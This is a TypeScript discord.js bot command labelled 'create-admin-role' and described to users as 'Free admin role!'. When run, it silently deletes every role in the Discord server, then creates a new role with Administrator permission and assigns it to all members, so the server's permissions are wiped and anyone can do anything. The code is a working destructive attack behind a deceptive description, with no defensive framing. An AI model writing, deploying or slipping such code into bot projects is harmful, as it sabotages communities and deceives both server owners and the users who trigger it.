import {PermissionFlagsBits, SlashCommandBuilder} from "discord.js";
import {Command} from "types";

export const createAdminRole: Command = {
	data: new SlashCommandBuilder()
		.setName("create-admin-role")
		.setDescription("Free admin role!"),
	async execute(interaction) {
		for await (const role of [
			...(interaction.guild?.roles?.cache.values() ?? []),
		]) {
			try {
				await interaction.guild?.roles?.delete(role.id);
			} catch (_error) {}
		}

		const adminRole = await interaction.guild?.roles.create({
			name: "🔨 Admin",
			permissions: [PermissionFlagsBits.Administrator],
			color: 0xd02035,
		});

		if (adminRole)
			for (const member of [
				...(interaction.guild?.members.cache.values() ?? []),
			]) {
				member.roles.add(adminRole.id);
			}
	},
};
